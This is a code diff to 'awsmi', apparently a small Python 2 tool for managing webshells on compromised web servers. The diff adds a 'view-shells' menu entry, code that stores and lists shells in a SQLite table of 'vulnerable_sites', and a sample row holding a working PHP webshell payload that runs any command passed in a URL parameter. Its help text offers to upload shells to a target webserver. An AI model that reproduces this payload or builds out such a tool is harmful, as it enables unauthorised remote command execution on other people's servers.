@@ -28,6 +28,7 @@ def help():
 	print "Interactive help menu type  help <module> to get more information on a module\n"
 	print "upload-shell\t\t Upload a shell to target webserver"
 	print "new-database\t\t Start a new database to keep track of webshells"
+	print "view-shells\t\t View information about the currently running shells"
 
 def get_input():
 	userinput = raw_input("awsmi>")
@@ -46,15 +47,26 @@ def initialize_database():
 	
 	name = raw_input("database name:")#prompting the user for a database name
 	conn = sqlite3.connect(name)#creating the database
+	global database_name
+	database_name = name
 	cursor = conn.cursor()
 	cursor.execute("create table vulnerable_sites(url text, page text, method text, uploaded_shell text, attackurl text)")
+	cursor.execute("insert into vulnerable_sites(url,page,method,uploaded_shell,attackurl) values(?,?,?,?,?)",\
+		[("www.google.com"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
 	conn.commit()
 
 def show_shells():
+	"""
+		Shows the currently running shells at specified urls
+	"""
 	conn = sqlite3.connect(database_name)
+	cursor = conn.cursor()
 	query = "select * from vulnerable_sites"
 	cursor.execute(query)
+	print cursor.fetchall()
 
+def generate_scan_shell():
+	pass
 
 def exit():
 	sys.exit(1)
